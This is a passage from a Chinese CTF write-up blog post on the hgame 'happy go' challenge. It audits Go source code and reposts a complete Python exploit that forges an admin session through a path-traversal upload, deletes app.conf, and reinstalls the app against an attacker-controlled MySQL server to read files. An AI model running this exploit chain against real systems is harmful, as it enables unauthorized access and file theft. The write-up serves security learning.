&#125;</span><br><span class="line"></span><br><span class="line">	o.QueryTable(<span class="string">"messages"</span>).Filter(<span class="string">"uid"</span>, id).Delete()</span><br><span class="line">	o.Delete(&amp;user)</span><br><span class="line"></span><br><span class="line">	u.Redirect(<span class="string">"/admin"</span>, http.StatusFound)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里可以看到如果修改头像参数，就可以删除任意文件<br>继续审计源码还可以看到<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *InstallController)</span> <span class="title">Get</span><span class="params">()</span></span> &#123;</span><br><span class="line">	_, err := os.Stat(<span class="string">"conf/app.conf"</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; os.IsNotExist(err) &#123;</span><br><span class="line">		c.TplName = <span class="string">"install.tpl"</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		c.Redirect(<span class="string">"/"</span>, http.StatusFound)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到install文件里面会检查有没有<code>app.conf</code>文件，如果没有就会重新加载<br>所以攻击思路就是<code>以管理员身份登录，删掉app.conf，然后install，用恶意的mysql服务器读取任意文件</code>，而伪造管理员身份就要去看主函数了<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	beego.BConfig.WebConfig.Session.SessionName = <span class="string">"PHPSESSID"</span></span><br><span class="line">	beego.BConfig.WebConfig.Session.SessionProvider=<span class="string">"file"</span></span><br><span class="line">	beego.BConfig.WebConfig.Session.SessionProviderConfig = <span class="string">"./tmp"</span></span><br><span class="line">	beego.BConfig.WebConfig.Session.SessionOn = <span class="literal">true</span></span><br><span class="line">	beego.Run()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>贴一篇其他师傅的exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">ip=<span class="string">"94.191.10.201"</span></span><br><span class="line">host=<span class="string">"http://94.191.10.201:7000"</span></span><br><span class="line">registerURL = host + <span class="string">"/auth/register"</span></span><br><span class="line">loginURL = host + <span class="string">"/auth/login"</span></span><br><span class="line">userinfoURL = host + <span class="string">"/userinfo"</span></span><br><span class="line">req = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># register</span></span><br><span class="line">registerData=&#123;<span class="string">"username"</span>:<span class="string">"ii5am3"</span>,<span class="string">"password"</span>:<span class="string">"123456"</span>,<span class="string">"confirmpass"</span>:<span class="string">"123456"</span>,&#125;</span><br><span class="line">r = req.post(registerURL,data=registerData)</span><br><span class="line">print(<span class="string">"[+] register "</span>+r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># login</span></span><br><span class="line">loginData=&#123;<span class="string">"username"</span>:<span class="string">"ii5am3"</span>,<span class="string">"password"</span>:<span class="string">"123456"</span>,&#125;</span><br><span class="line">r = req.post(loginURL,data=loginData)</span><br><span class="line">print(<span class="string">r"[+] login "</span>+r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前登陆用户的sessionID</span></span><br><span class="line">sessionID = r.request._cookies._cookies[ip][<span class="string">"/"</span>][<span class="string">"PHPSESSID"</span>].value</span><br><span class="line">print(<span class="string">r"[+] sessionID is "</span>+ sessionID)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传session，伪造cookie</span></span><br><span class="line">newSession = sessionID[<span class="number">0</span>:<span class="number">2</span>]+<span class="string">"5am3"</span></span><br><span class="line">filename = <span class="string">"../../tmp/%s/%s/%s"</span> %(sessionID[<span class="number">0</span>],sessionID[<span class="number">1</span>],newSession)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地搭建环境，登入uid为1的账号，然后获取他的session的文件即可。在这里我给大家</span></span><br><span class="line">attackSession = base64.b64decode(<span class="string">"Dv+BBAEC/4IAARABEAAAGv+CAAEGc3RyaW5nDAUAA3VpZANpbnQEAgAC"</span>)</span><br><span class="line">sessionFiles=&#123;<span class="string">"uploadname"</span> : (filename, attackSession)&#125;</span><br><span class="line">r = req.post(userinfoURL,files=sessionFiles)</span><br><span class="line">print(<span class="string">r"[+] newCookie is: PHPSESSID="</span>+ newSession)</span><br><span class="line"></span><br><span class="line"><span class="comment">##服务端伪造脚本</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># req表示user1，此时全程用该一个session</span></span><br><span class="line">req = requests.session()</span><br><span class="line">ip = <span class="string">"94.191.10.201"</span></span><br><span class="line">host = <span class="string">"http://94.191.10.201:7000"</span></span><br><span class="line">registerURL = host + <span class="string">"/auth/register"</span></span><br><span class="line">loginURL= host + <span class="string">"/auth/login"</span></span><br><span class="line">userinfoURL = host + <span class="string">"/userinfo"</span></span><br><span class="line">deleteUserURL = host +<span class="string">"/admin/user/del/2"</span></span><br><span class="line">installURl = host + <span class="string">"/install"</span></span><br><span class="line">attackCookie = base64.b64decode(<span class="string">"Dv+BBAEC/4IAARABEAAAGv+CAAEGc3RyaW5nDAUAA3VpZANpbnQEAgAC"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># register</span></span><br><span class="line">registerData=&#123;<span class="string">"username"</span>:<span class="string">"ii5am3"</span>,<span class="string">"password"</span>:<span class="string">"123456"</span>,<span class="string">"confirmpass"</span>:<span class="string">"123456"</span>,&#125;</span><br><span class="line">r= req.post(registerURL,data=registerData)</span><br><span class="line">print(<span class="string">"[+] register "</span>+r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># login</span></span><br><span class="line">loginData=&#123;<span class="string">"username"</span>:<span class="string">"ii5am3"</span>,<span class="string">"password"</span>:<span class="string">"123456"</span>,&#125;</span><br><span class="line">r = req.post(loginURL,data=loginData)</span><br><span class="line">print(<span class="string">r"[+] login "</span>+r.text)</span><br><span class="line">sessionID= r.request._cookies._cookies[ip][<span class="string">"/"</span>][<span class="string">"PHPSESSID"</span>].value</span><br><span class="line">print(<span class="string">r"[+] sessionID is "</span>+ sessionID)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传session，伪造cookie</span></span><br><span class="line">newSession = sessionID[<span class="number">0</span>:<span class="number">2</span>]+<span class="string">"5am3"</span></span><br><span class="line">filename = <span class="string">"../../tmp/%s/%s/%s"</span> %(sessionID[<span class="number">0</span>],sessionID[<span class="number">1</span>],newSession)</span><br><span class="line">sessionFiles=&#123;<span class="string">"uploadname"</span> : (filename, attackCookie)&#125;</span><br><span class="line">r = req.post(userinfoURL,files=sessionFiles)</span><br><span class="line">print(<span class="string">r"[+] newSessionID is "</span>+ newSession)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改头像文件链接。</span></span><br><span class="line">sessionFiles=&#123;<span class="string">"uploadname"</span> : (<span class="string">"../../conf/app.conf"</span>, <span class="string">"12345"</span>)&#125;</span><br><span class="line">r = req.post(userinfoURL,files=sessionFiles)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个请求，伪造admin进行删除用户</span></span><br><span class="line">headers=&#123;<span class="string">"Cookie"</span>:<span class="string">"PHPSESSID="</span>+newSession&#125;</span><br><span class="line">r = requests.get(deleteUserURL,headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新安装环境，将其指向我们的恶意sql服务器。</span></span><br><span class="line">installData = &#123;</span><br><span class="line">    <span class="string">"host"</span>:<span class="string">"your_ip"</span>,</span><br><span class="line">    <span class="string">"port"</span>:<span class="string">"your_port"</span>,</span><br><span class="line">    <span class="string">"username"</span>:<span class="string">"hgame"</span>,<span class="string">"password"</span>:<span class="string">"hgame"</span>,<span class="string">"database"</span>:<span class="string">"hgame"</span>&#125;</span><br><span class="line">r = requests.post(installURl,installData)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次登录，使其再来一次请求。</span></span><br><span class="line">loginData=&#123;<span class="string">"username"</span>:<span class="string">"ii5am3"</span>,<span class="string">"password"</span>:<span class="string">"123456"</span>,&#125;</span><br><span class="line">r = req.post(loginURL,data=loginData)</span><br><span class="line">print(<span class="string">r"[+] login "</span>+r.text)</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/06/2019-3-6-2019-hgame-week3/" rel="next" title="2019 hgame week3">
+                <i class="fa fa-chevron-left"></i> 2019 hgame week3
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/03/15/2019-3-15-利用mysql-local-infile读取客户端文件/" rel="prev" title="利用mysql local infile读取客户端文件">
+                利用mysql local infile读取客户端文件 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Xi4or0uji">
+            
+              <p class="site-author-name" itemprop="name">Xi4or0uji</p>
+              <p class="site-description motion-element" itemprop="description">还在路上</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">46</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#happy-python"><span class="nav-number">1.</span> <span class="nav-text">happy python</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#happy-php"><span class="nav-number">2.</span> <span class="nav-text">happy php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#happy-java"><span class="nav-number">3.</span> <span class="nav-text">happy java</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#happy-go"><span class="nav-number">4.</span> <span class="nav-text">happy go</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Xi4or0uji</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("kjsqHE2szT8D8zBgcoS3IuDJ-gzGzoHsz", "W2CzS27kkRW94qWAYaaWlnX7");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
